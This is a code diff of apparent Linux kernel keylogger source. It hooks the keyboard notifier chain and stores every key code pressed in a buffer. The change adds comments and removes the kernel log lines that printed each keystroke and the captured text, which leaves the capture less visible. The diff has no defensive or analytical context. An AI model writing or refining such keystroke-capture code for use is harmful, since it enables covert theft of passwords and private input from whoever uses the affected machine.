@@ -4,12 +4,13 @@
 #include "keylogger.h"
 
 char keystrokes[BUFFER_SIZE];
-char *pkeystrokes;
+static char *pkeystrokes;
 
 struct notifier_block nb = {
 	.notifier_call = keylogger_notifier
 };
 
+// table for easily converting key codes to ascii
 #define SPACE_KEY_CODE	0x39
 #define FIRST_KEY_CODE	0x2
 #define LAST_KEY_CODE	0x35
@@ -25,6 +26,8 @@ static void add_keycode(int key_code);
 void init_keylogger(void) {
 	memset(keystrokes, 0, sizeof(keystrokes));
 	pkeystrokes = keystrokes;
+
+	// register the keyboard notifier, for keyboard interrupts
 	register_keyboard_notifier(&nb);
 	return;
 }
@@ -44,8 +47,6 @@ int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *da
 		// get the key code of the key pressed
 		key_code = param->value;
 		add_keycode(key_code);
-		printk(KERN_INFO "key pressed: 0x%x\n", key_code);
-		printk(KERN_INFO "new keystrokes: |%s|\n", keystrokes);
 	}
 
 	return NOTIFY_OK;
